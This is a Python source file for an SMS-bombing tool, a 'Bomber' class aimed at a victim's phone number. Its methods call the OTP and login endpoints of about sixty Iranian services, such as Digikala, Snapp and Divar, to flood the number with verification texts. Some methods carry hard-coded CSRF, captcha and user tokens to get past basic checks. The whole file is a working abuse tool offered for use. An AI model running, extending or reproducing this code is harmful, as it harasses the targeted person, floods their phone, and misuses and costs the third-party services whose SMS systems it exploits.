import requests
import time
import uuid
import sys
import subprocess

# نصب requests اگر نصب نباشد
try:
    import requests
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

class Bomber:
    def __init__(self, phone):
        self.phone = phone
        self.timeout = 10
        
    def _fmt(self): 
        return self.phone
        
    def _fmt98(self): 
        return f"+98{self.phone[1:]}"
        
    def _fmt0(self): 
        return self.phone[1:]

    # ============== سرویس‌ها ==============
    
    def _gharar(self):
        try:
            url = "https://gharar.ir/users/phone_number/"
            data = {"phone": self._fmt(), "termsConfirmed": "true"}
            headers = {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}
            return requests.post(url, headers=headers, data=data, timeout=self.timeout).status_code
        except: 
            return 0

    def _arzdigital(self):
        try:
            url = "https://idp.arzdigital.com/account/v1/send-otp-phone"
            payload = {"arcaptcha_token": "473337506026102972892018435914", "country_code": "+98", "phone_no": self._fmt(), "type": "login"}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _filimo(self):
        try:
            url = "https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1"
            payload = {"temp_id": "322424", "account": self._fmt(), "codepass_type": "otp", "guid": "0D815F19-037A-6F0A-74C0-1064282ACA76"}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _basalam(self):
        try:
            url = "https://auth.basalam.com/captcha/otp-request"
            payload = {"mobile": self._fmt(), "client_id": "11", "login_by_backup_mobile": False}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _filmnet(self):
        try:
            url = f"https://filmnet.ir/api-v2/access-token/users/{self._fmt()}/otp"
            return requests.get(url, headers={"Accept": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _fschool(self):
        try:
            url = "https://app.filimo.school/api/auth/token"
            payload = {"phone": self._fmt(), "signup": False, "channel": "sms", "gtoken": None}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _divar(self):
        try:
            url = "https://api.divar.ir/v5/auth/authenticate"
            return requests.post(url, json={"phone": self._fmt()}, timeout=self.timeout).status_code
        except: 
            return 0

    def _tapsi(self):
        try:
            url = "https://accounts-api.tapsi.ir/api/v1/sso-user/auth"
            payload = {"phone_number": self._fmt(), "session_id": f"{uuid.uuid4()}--{uuid.uuid4()}", "selected_step_key": "PROMPT_FOR_SMS_CODE"}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _abarkelas(self):
        try:
            url = "https://abarkelas.ir/auth/register/"
            payload = {"phoneNumber": self._fmt()}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _torob(self):
        try:
            url = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={self._fmt()}"
            return requests.get(url, timeout=self.timeout).status_code
        except: 
            return 0

    def _gap(self):
        try:
            url = f"https://core.gap.im/v1/user/add.json?mobile={self._fmt()}"
            return requests.get(url, timeout=self.timeout).status_code
        except: 
            return 0

    def _digikala(self):
        try:
            url = "https://api.digikala.com/v1/user/authenticate/"
            payload = {"backUrl": "/", "username": self._fmt(), "otp_call": False, "hash": None}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _namava(self):
        try:
            url = "https://www.namava.ir/api/v1.0/accounts/login/by-otp/request"
            payload = {"UserName": self._fmt()}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _mrbilit(self):
        try:
            url = f"https://auth.mrbilit.ir/api/Token/send?mobile={self._fmt()}"
            return requests.get(url, timeout=self.timeout).status_code
        except: 
            return 0

    def _jabama(self):
        try:
            url = "https://gw.jabama.com/api/v4/account/send-code"
            payload = {"mobile": self._fmt()}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _appetit(self):
        try:
            url = "https://staging.api.appetit.fit/api/v2/login"
            payload = {"mobile": self._fmt()}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _karafs(self):
        try:
            url = "https://v2.karafsapp.com/requestCode"
            payload = {"phoneNumber": self._fmt(), "market": "PWA"}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _pindo(self):
        try:
            url = "https://api.pindo.ir/v1/user/login-register/"
            payload = {"phone": self._fmt()}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json", "Origin": "https://www.pindo.ir"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _azkivam(self):
        try:
            url = "https://api.azkivam.com/auth/login"
            payload = {"mobileNumber": self._fmt()}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json", "Origin": "https://azkivam.com"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _tamasha(self):
        try:
            url = "https://api.tamashakhoneh.ir/v4/auth/register"
            payload = {"mobile": self._fmt()}
            headers = {"Content-Type": "application/json", "Origin": "https://tmk.ir"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            if r.status_code == 409:
                r = requests.post("https://api.tamashakhoneh.ir/v4/auth/otp", json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except: 
            return 0

    def _behtarino(self):
        try:
            url = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
            payload = {"phone": self._fmt()}
            headers = {"Content-Type": "application/json", "Origin": "https://behtarino.com", "site": "behtarino"}
            return requests.post(url, json=payload, headers=headers, timeout=self.timeout).status_code
        except: 
            return 0

    def _iapps(self):
        try:
            url = "https://api.iapps.ir/accounts/otp/generate"
            payload = {"phoneNumber": self._fmt98()}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _unitech(self):
        try:
            url = "https://api.unitech.ir/api/otp"
            payload = {"cellphone": self._fmt()}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _okala(self):
        try:
            url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
            payload = {"mobile": self._fmt(), "confirmTerms": True, "notRobot": False, "ValidationCodeCreateReason": 5, "OtpApp": 0, "IsAppOnly": False, "deviceTypeCode": 7}
            return requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _snapp(self):
        try:
            url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
            payload = {"cellphone": self._fmt()}
            headers = {"x-app-name": "passenger-pwa", "x-app-version": "5.0.0"}
            return requests.post(url, json=payload, headers=headers, timeout=self.timeout).status_code
        except: 
            return 0

    def _snappfood(self):
        try:
            url = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass"
            params = {"lat": "35.774", "long": "51.418", "client": "WEBSITE"}
            data = {"cellphone": self._fmt()}
            return requests.post(url, params=params, data=data, headers={"content-type": "application/x-www-form-urlencoded"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _snappmarket(self):
        try:
            url = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={self._fmt()}"
            return requests.post(url, headers={"content-type": "text/plain"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _sheypoor(self):
        try:
            url = "https://www.sheypoor.com/auth"
            data = {"username": self._fmt0()}
            return requests.post(url, data=data, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _alibaba(self):
        try:
            url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
            payload = {"phoneNumber": self._fmt()}
            return requests.post(url, json=payload, headers={"ab-channel": "WEB"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _snapptrip(self):
        try:
            url = "https://www.snapptrip.com/register"
            payload = {"lang": "fa", "country_id": "860", "password": "pass", "mobile_phone": self._fmt(), "country_code": "+98", "email": "a@b.com"}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _drdr(self):
        try:
            url = "https://drdr.ir/api/registerEnrollment/sendDisposableCode"
            params = {"phoneNumber": self._fmt(), "userType": "PATIENT"}
            return requests.post(url, headers={"Authorization": "hiToken"}, params=params, timeout=self.timeout).status_code
        except: 
            return 0

    def _itoll(self):
        try:
            url = "https://app.itoll.ir/api/v1/auth/login"
            payload = {"mobile": self._fmt()}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _anargift(self):
        try:
            url = "https://api.anargift.com/api/people/auth"
            payload = {"user": self._fmt(), "app_id": 99}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _azki(self):
        try:
            url = f"https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22:%22azki_{self._fmt()}%22%7D"
            headers = {"Authorization": "Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==", "device": "web", "user-token": "LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE"}
            return requests.post(url, headers=headers, timeout=self.timeout).status_code
        except: 
            return 0

    def _nobat(self):
        try:
            url = "https://nobat.ir/api/public/patient/login/phone"
            payload = {"mobile": self._fmt()}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _chamedoon(self):
        try:
            url = "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification"
            payload = {"mobile": self._fmt(), "origin": "/", "referrer_id": None}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _banimode(self):
        try:
            url = "https://mobapi.banimode.com/api/v2/auth/request"
            payload = {"phone": self._fmt()}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _lendo(self):
        try:
            url = "https://lendo.ir/register?"
            data = {"_token": "mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6", "mobile": self._fmt(), "password": "pass"}
            return requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _olgoo(self):
        try:
            url = "https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1"
            data = {"contactInfo[mobile]": self._fmt(), "contactInfo[agreementAccepted]": "1", "contactInfo[teachingFieldId]": "1", "contactInfo[eduGradeIds][7]": "7", "submit_register": "1"}
            return requests.post(url, data=data, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _pakhsh(self):
        try:
            url = "https://www.pakhsh.shop/wp-admin/admin-ajax.php"
            data = f"action=digits_check_mob&countrycode=%2B98&mobileNo={self._fmt()}&csrf=fdaa7fc8e6&login=2&json=1"
            return requests.post(url, data=data, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _didnegar(self):
        try:
            url = "https://www.didnegar.com/wp-admin/admin-ajax.php"
            data = f"action=digits_check_mob&countrycode=%2B98&mobileNo={self._fmt0()}&csrf=4c9ac22ff4&login=1&json=1&mobmail={self._fmt()}"
            return requests.post(url, data=data, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _buskool(self):
        try:
            url = "https://www.buskool.com/send_verification_code"
            payload = {"phone": self._fmt()}
            headers = {"X-CSRF-TOKEN": "trUVHIRWtjE58Fn9Pud1ciz2XaTbTgFHgCLsPykD", "X-Requested-With": "XMLHttpRequest"}
            return requests.post(url, json=payload, headers=headers, timeout=self.timeout).status_code
        except: 
            return 0

    def _kilid(self):
        try:
            url = "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL"
            payload = {"mobile": self._fmt()}
            headers = {"COUNTRY_ID": "2", "LOCALE": "FA"}
            return requests.post(url, json=payload, headers=headers, timeout=self.timeout).status_code
        except: 
            return 0

    def _see5(self):
        try:
            url = "https://crm.see5.net/api_ajax/sendotp.php"
            data = {"mobile": self._fmt(), "action": "sendsms"}
            r = requests.post(url, data=data, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=self.timeout)
            return 200 if "send_sms" in r.text else 0
        except: 
            return 0

    def _ghabzino(self):
        try:
            url = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode"
            payload = {"Parameters": {"ApplicationType": "Web", "ApplicationVersion": "1.0.0", "MobileNumber": self._fmt()}}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _simkhan(self):
        try:
            url = "https://www.simkhanapi.ir/api/users/registerV2"
            payload = {"mobileNumber": self._fmt(), "ReSendSMS": False}
            return requests.post(url, json=payload, headers={"Authorization": "Bearer undefined"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _drsaina(self):
        try:
            url = "https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation"
            data = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&PhoneNumber={self._fmt()}"
            return requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _binjo(self):
        try:
            url = f"https://api.binjo.ir/api/panel/get_code/{self._fmt()}"
            return requests.get(url, verify=False, timeout=self.timeout).status_code
        except: 
            return 0

    def _limome(self):
        try:
            url = "https://my.limoome.com/api/auth/login/otp"
            data = {"mobileNumber": self._fmt0(), "country": "1"}
            return requests.post(url, data=data, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _bimito(self):
        try:
            url = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%22{self._fmt()}%22%7D"
            headers = {"device": "web", "deviceid": "3", "user-token": "swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp"}
            return requests.post(url, headers=headers, timeout=self.timeout).status_code
        except: 
            return 0

    def _bimitovip(self):
        try:
            url = f"https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%22{self._fmt()}%22%7D"
            headers = {"device": "web", "deviceid": "3", "user-token": "swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp"}
            return requests.post(url, headers=headers, timeout=self.timeout).status_code
        except: 
            return 0

    def _seebirani(self):
        try:
            url = "https://sandbox.sibirani.ir/api/v1/user/invite"
            payload = {"username": self._fmt()}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _mihanpezeshk(self):
        try:
            url = "https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient"
            data = f"_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={self._fmt()}&recaptcha="
            return requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _hamrah(self):
        try:
            url = "https://www.hamrah-mechanic.com/api/v1/auth/login"
            payload = {"landingPageUrl": "https://www.hamrah-mechanic.com/", "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/", "phoneNumber": self._fmt(), "prevDomainUrl": None, "prevUrl": None, "referrer": "https://www.google.com/"}
            return requests.post(url, json=payload, headers={"Source": "web"}, timeout=self.timeout).status_code
        except: 
            return 0

    def _telewebion(self):
        try:
            url = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
            data = {"code": "98", "phone": self._fmt0(), "smsStatus": "default"}
            return requests.post(url, data=data, timeout=self.timeout).status_code
        except: 
            return 0

    def _echarge(self):
        try:
            url = "https://www.echarge.ir/m/login?length=19"
            payload = {"phoneNumber": self._fmt()}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _shad(self):
        try:
            url = "https://shadmessenger12.iranlms.ir/"
            payload = {"phone": self._fmt()}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _rubika(self):
        try:
            url = "https://messengerg2c4.iranlms.ir/"
            payload = {"phone": self._fmt98()}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _emtiaz(self):
        try:
            url = "https://web.emtiyaz.app/json/login"
            payload = {"phone": self._fmt98()}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    def _gapfilm(self):
        try:
            url = "https://core.gapfilm.ir/api/v3.1/Account/Login"
            payload = {"Type": 3, "Username": self._fmt0(), "SourceChannel": "GF_WebSite", "SourcePlatform": "desktop"}
            return requests.post(url, json=payload, timeout=self.timeout).status_code
        except: 
            return 0

    # ============== لیست سرویس‌ها ==============
    
    def get_services(self):
        return [
            {"name": "Gharar", "func": self._gharar},
            {"name": "ArzDigital", "func": self._arzdigital},
            {"name": "Filimo", "func": self._filimo},
            {"name": "Basalam", "func": self._basalam},
            {"name": "Filmnet", "func": self._filmnet},
            {"name": "FilimoSchool", "func": self._fschool},
            {"name": "Divar", "func": self._divar},
            {"name": "Tapsi", "func": self._tapsi},
            {"name": "AbarKelas", "func": self._abarkelas},
            {"name": "Torob", "func": self._torob},
            {"name": "Gap", "func": self._gap},
            {"name": "Digikala", "func": self._digikala},
            {"name": "Namava", "func": self._namava},
            {"name": "MrBilit", "func": self._mrbilit},
            {"name": "Jabama", "func": self._jabama},
            {"name": "Appetit", "func": self._appetit},
            {"name": "Karafs", "func": self._karafs},
            {"name": "Pindo", "func": self._pindo},
            {"name": "Azkivam", "func": self._azkivam},
            {"name": "Tamasha", "func": self._tamasha},
            {"name": "Behtarino", "func": self._behtarino},
            {"name": "IApps", "func": self._iapps},
            {"name": "Unitech", "func": self._unitech},
            {"name": "Okala", "func": self._okala},
            {"name": "Snapp", "func": self._snapp},
            {"name": "SnappFood", "func": self._snappfood},
            {"name": "SnappMarket", "func": self._snappmarket},
            {"name": "Sheypoor", "func": self._sheypoor},
            {"name": "Alibaba", "func": self._alibaba},
            {"name": "SnappTrip", "func": self._snapptrip},
            {"name": "DrDr", "func": self._drdr},
            {"name": "Itoll", "func": self._itoll},
            {"name": "Anargift", "func": self._anargift},
            {"name": "Azki", "func": self._azki},
            {"name": "Nobat", "func": self._nobat},
            {"name": "Chamedoon", "func": self._chamedoon},
            {"name": "BaniMode", "func": self._banimode},
            {"name": "Lendo", "func": self._lendo},
            {"name": "Olgoo", "func": self._olgoo},
            {"name": "Pakhsh", "func": self._pakhsh},
            {"name": "DideNegar", "func": self._didnegar},
            {"name": "Buskool", "func": self._buskool},
            {"name": "Kilid", "func": self._kilid},
            {"name": "See5", "func": self._see5},
            {"name": "Ghabzino", "func": self._ghabzino},
            {"name": "SimKhan", "func": self._simkhan},
            {"name": "DrSaina", "func": self._drsaina},
            {"name": "Binjo", "func": self._binjo},
            {"name": "Limome", "func": self._limome},
            {"name": "Bimito", "func": self._bimito},
            {"name": "BimitoVip", "func": self._bimitovip},
            {"name": "SeeBirani", "func": self._seebirani},
            {"name": "MihanPezeshk", "func": self._mihanpezeshk},
            {"name": "Hamrah", "func": self._hamrah},
            {"name": "Telewebion", "func": self._telewebion},
            {"name": "Echarge", "func": self._echarge},
            {"name": "Shad", "func": self._shad},
            {"name": "Rubika", "func": self._rubika},
            {"name": "Emtiaz", "func": self._emtiaz},
            {"name": "GapFilm", "func": self._gapfilm},
        ]
